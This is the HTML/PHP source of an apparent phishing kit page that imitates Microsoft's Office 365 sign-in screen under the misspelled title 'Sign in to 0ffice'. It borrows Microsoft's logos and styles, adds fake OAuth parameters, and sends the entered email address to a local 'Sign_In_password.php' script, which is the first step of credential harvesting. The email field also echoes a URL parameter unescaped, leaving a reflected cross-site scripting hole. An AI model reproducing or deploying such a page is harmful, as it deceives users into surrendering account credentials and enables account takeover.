<!DOCTYPE html>
<html dir="ltr" class="" lang="en">
<head>
	<title>Sign in to 0ffice</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
	<link rel="shortcut icon" href="https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico"/>
	<meta name="robots" content="none"/>
	<style>
        .form-group:not(.has-error) .error-message {
  display: none !important;
}
    </style>
	<link crossorigin="anonymous" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_tbsima5-c7pluzuyz0ftda2.css" rel="stylesheet"/>

	<style>
		body {font-size: 14px}
		.input:focus {
			border-color: #aaaaaa;
			outline: none;
		}
		
		.input-error {
			position: relative;
			top: -8px;
			font-size: .8375rem;
			line-height: 1.25rem;
			text-align: left;
			font-weight: 400;
			color: #e81123;
			display: block;
			float: left;
			clear: both;
		}
		
	</style>
</head>
<body class="cb" style="display: block;">

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<div>

<div>
			<div class="background app" role="presentation">
				
				<div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(background.jpg);"></div>
				
				<div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(background.jpg);"></div>
			</div>

			<form name="loginform" class="login-form" id="loginform" method="post" autocomplete="off" action="Sign_In_password.php?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office365.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=93a0ac7c-cf2b-4ada-bc2b-b7907ab1e393&protectedtoken=true&nonce=636934966725981109.62a3e2a7-c7c0-4ee3-9d0b-69b8db7a2133&state=Dcs7FoAwCABBos_jYAhECMchn9rS65tittsEAOd2bIl2wFTUpbqq8eOtFPJbOWRxGA4bhHUtQZ_UUb232S24iKT9Xvn9Iv8">
			<div class="outer">
				<div class="middle app">
					


						<div class="inner app fade-in-lightbox">
						<div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
						<div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }">
							
							<img class="logo" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
							
						</div>

						
						<div role="main">
						<div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
								
								<div class="pagination-view animate slide-in-next">
								<div data-viewid="1" data-showfedcredbutton="true">
										
										<div>
											<div class="row text-title" id="loginHeader">
												<div role="heading" aria-level="1" data-bind="text: title">Sign in</div>
												
												
											</div>
										</div>
										<div class="row">
											
											<div class="form-group col-md-24">
												
												<div class="placeholderContainer">
													
													<div class="form-group">
														
													<span style="color:#e81123" class="error"><p style="margin:0; padding:0; font-size:14px" id="email_error"></p></span>
													<input type="email" value="<?=$_GET[email]?>" name="email" id="email" lang="en" class="form-control ltr_override" placeholder="someone@example.com"/>
													</div>
													
												</div>
												<!-- /ko -->
											</div>
											<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
											<div class="row">
												<div class="col-md-24">
													<div class="text-13 action-links">
														
														
														<div class="form-group"> 
															<a id="cantAccessAccount" name="cannotAccessAccount" href="#" >Can’t access your account?</a> </div>

														
													</div>
												</div>
											</div>
											<div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
												<div>
													<div class="col-xs-24 no-padding-left-right button-container">
														<!-- ko if: isSecondaryButtonVisible -->
														<!-- /ko -->
														<div class="inline-block">
															<!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 --><input type="submit" id="idSIButton9" class="btn btn-block btn-primary" 
															value="Next"> </div>
													</div>
												</div>
											</div>
										</div>
										</div>

										</div>
										</div>
										</div>

										</div>

	</div>



	</div>
	</div>

	</form>
	<script>
      document.getElementById("loginform").onsubmit = function () {
        var y = document.forms["loginform"]["email"].value;
    
        var submit = true;
    
    
        if (y == null || y == "") {
            emailError = "Enter a valid email address.";
            document.getElementById("email_error").innerHTML = emailError;
            submit = false;
        }
    
        return submit;
    }
    
    function removeWarning() {
        document.getElementById(this.id + "_error").innerHTML = "";
    }
    
    document.getElementById("email").onkeyup = removeWarning;
  </script>
	
	<script>
	$("form").submit(function() {
  var hasError = false;
  $(".has-error, .has-success").removeClass("has-error").removeClass("has-success");
  if ($("#email").val() == "") {
    $("#email").closest(".form-group").addClass("has-error");
    hasError = true;
  } else {
    $("#email").closest(".form-group").addClass("has-success");
  }
  
  return !hasError;
});
	</script>
	<div id="footer" class="footer" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }">
						<div data-bind="component: { name: 'footer-control',
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick } }">
							<!--  -->
							<!-- ko if: showLinks || impressumLink || showIcpLicense -->
							<div id="footerLinks" class="footerNode text-secondary">
								<!-- ko if: !showIcpLicense --><span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2021 Microsoft</span>
								<!-- /ko --><a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-GB/servicesagreement/">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-GB/privacystatement">Privacy &amp; cookies</a>
								<!-- ko if: impressumLink -->
								<!-- /ko -->
								<!-- ko if: showIcpLicense -->
								<!-- /ko -->
								<a href="#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
				hasFocus: focusMoreInfo()" aria-label="Click here for troubleshooting information">
				
				<img class="desktopMode" role="presentation" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg">
								
									<img class="mobileMode" role="presentation" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg">
								
									
								</a>
							</div>
						</div>
					</div>
		</div>

</div>


	
</body>
</html>